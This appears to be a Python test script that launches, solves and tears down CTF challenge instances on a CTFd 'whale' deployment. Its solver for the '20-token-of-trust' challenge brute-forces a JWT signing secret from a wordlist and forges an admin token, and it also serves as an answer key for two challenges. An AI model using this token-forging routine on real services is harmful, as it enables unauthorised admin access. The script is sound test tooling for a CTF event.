#!/usr/bin/env python3
"""Check the whole path of a deployable challenge on the production stack.

For every challenge in catalog.DEPLOYABLE this launches an instance for a
temporary test team through whale (swarm service + frp route), opens it through
Caddy exactly as a player's browser would, solves it, and checks that the flag
it serves is the one whale will accept. Then it stops the instance and deletes
the test team.

It does not touch rounds, so it is safe to run before or during the event.
It needs docker-compose.production.yml (it reaches instances via Caddy).
"""

import base64
import hashlib
import hmac
import importlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, "/opt/CTFd")

from CTFd import create_app
from CTFd.models import Challenges, Teams, Users, db
from CTFd.utils import get_config

TESTER = "whaletester"
# Caddy's address inside the compose network. Instances are selected by Host.
PROXY = os.environ.get("WHALE_TEST_PROXY", "http://caddy")
START_TIMEOUT = 60


def http_get(host, path="/", headers=None):
    req = urllib.request.Request(PROXY + path, headers={"Host": host, **(headers or {})})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode()


def wait_until_up(host):
    started = time.time()
    while True:
        try:
            http_get(host)
            return time.time() - started
        except (urllib.error.URLError, ConnectionError) as exc:
            if time.time() - started > START_TIMEOUT:
                raise AssertionError(f"{host} not reachable after {START_TIMEOUT}s: {exc}")
            time.sleep(0.5)


def solve_01(host):
    parts = {}
    for path in ("/", "/style.css", "/script.js"):
        for n, text in re.findall(r"Part (\d)/3 of the flag: (\S+)", http_get(host, path)):
            parts[n] = text
    return "".join(parts[n] for n in sorted(parts))


def solve_20(host):
    b64d = lambda s: base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    sign = lambda key, msg: b64e(hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest())

    token = re.search(r"eyJ[\w-]+\.[\w-]+\.[\w-]+", http_get(host)).group(0)
    header, payload, signature = token.split(".")
    words = http_get(host, "/backup/wordlist.txt").split()
    secret = next(w for w in words if sign(w, f"{header}.{payload}") == signature)
    claims = json.loads(b64d(payload))
    claims["role"] = "admin"
    forged_payload = b64e(json.dumps(claims).encode())
    forged = f"{header}.{forged_payload}.{sign(secret, f'{header}.{forged_payload}')}"
    vault = http_get(host, "/vault", {"Authorization": f"Bearer {forged}"})
    return re.search(r"TAIBAH\{[^}]*\}", vault).group(0)


SOLVERS = {"01-inspect-the-oasis": solve_01, "20-token-of-trust": solve_20}


def cleanup(control):
    user = Users.query.filter_by(name=TESTER).first()
    if user is None:
        return
    control.ControlUtil.try_remove_container(user.id)
    team_id = user.team_id
    user.team_id = None
    if team_id:
        Teams.query.filter_by(id=team_id).update({Teams.captain_id: None})
    db.session.flush()
    if team_id:
        Teams.query.filter_by(id=team_id).delete()
    db.session.delete(user)
    db.session.commit()


def main():
    app = create_app()
    with app.app_context():
        catalog = importlib.import_module("CTFd.plugins.ctfd-rounds.catalog")
        checks = importlib.import_module("CTFd.plugins.ctfd-whale.utils.checks")
        control = importlib.import_module("CTFd.plugins.ctfd-whale.utils.control")
        whale_db = importlib.import_module("CTFd.plugins.ctfd-whale.utils.db")

        errors = checks.WhaleChecks.perform()
        assert not errors, f"whale settings: {errors}"
        suffix = get_config("whale:frp_http_domain_suffix")
        names = {c["slug"]: c["name"] for c in catalog.CHALLENGES}

        cleanup(control)
        user = Users(name=TESTER, email=f"{TESTER}@example.com", password=os.urandom(16).hex())
        db.session.add(user)
        db.session.flush()
        team = Teams(name=TESTER, email=f"{TESTER}-team@example.com", password=os.urandom(16).hex(),
                     captain_id=user.id, hidden=True)
        db.session.add(team)
        db.session.flush()
        user.team_id = team.id
        db.session.commit()

        failed = False
        try:
            for slug in catalog.DEPLOYABLE:
                challenge = Challenges.query.filter_by(name=names[slug]).one()
                ok, message = control.ControlUtil.try_add_container(user.id, challenge.id)
                assert ok, f"{slug}: launch failed: {message} (see `docker compose logs ctfd`)"
                container = whale_db.DBContainer.get_current_containers(user.id)
                host = f"{container.http_subdomain}.{suffix}"
                try:
                    took = wait_until_up(host)
                    solver = SOLVERS.get(slug)
                    if solver is None:
                        print(f"PASS {slug}: reachable at http://{host}/ after {took:.1f}s (no solver)")
                        continue
                    flag = solver(host)
                    if flag == container.flag:
                        print(f"PASS {slug}: solved via http://{host}/ after {took:.1f}s")
                    else:
                        failed = True
                        print(f"FAIL {slug}: served {flag!r}, whale expects {container.flag!r}")
                finally:
                    ok, message = control.ControlUtil.try_remove_container(user.id)
                    assert ok, f"{slug}: stop failed: {message}"
        finally:
            cleanup(control)
        if failed:
            sys.exit(1)
        print("PASS all deployable challenges launch, route, solve, and stop")


if __name__ == "__main__":
    main()
